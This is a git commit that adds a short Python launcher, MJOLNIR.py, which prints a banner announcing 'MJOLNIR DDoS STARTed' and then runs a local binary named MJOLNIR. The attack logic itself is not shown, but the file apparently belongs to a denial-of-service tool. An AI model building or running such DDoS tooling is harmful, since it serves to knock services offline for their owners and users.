c258f2580799a8977198e84ae8f30dd99ef8536e
BLACK-ZERO <madman4205666@gmail.com>
2025-09-17 18:27:22 +0600

    Create MJOLNIR.py

---
+++ MJOLNIR.py
@@ -0,0 +1,14 @@
+import os
+import time
+def info():
+    print("\033[92m\033[1m [🔥] MJOLNIR DDoS STARTed")
+    time.sleep(1.5)
+def start():
+    os.system("./MJOLNIR")
+def run():
+    info()
+    start()
+
+if __name__ == "__main__":
+   run()
+    
